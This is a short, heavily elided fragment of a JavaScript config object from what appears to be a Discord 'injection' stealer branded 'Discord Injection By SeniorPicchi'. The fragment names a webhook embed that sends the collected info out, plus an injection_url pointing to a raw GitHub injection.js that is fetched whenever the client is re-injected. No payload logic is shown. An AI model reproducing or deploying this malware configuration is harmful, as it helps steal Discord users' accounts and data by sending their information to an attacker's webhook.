...
const config = {
  ...
  embed_name: 'PiccHiPY Injection', //name of the webhook thats gonna send the info
  ...
  injection_url: 'https://raw.githubusercontent.com/SeniorPicchi/injection-JS/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By SeniorPicchi',
        },
      },
    ],
  };
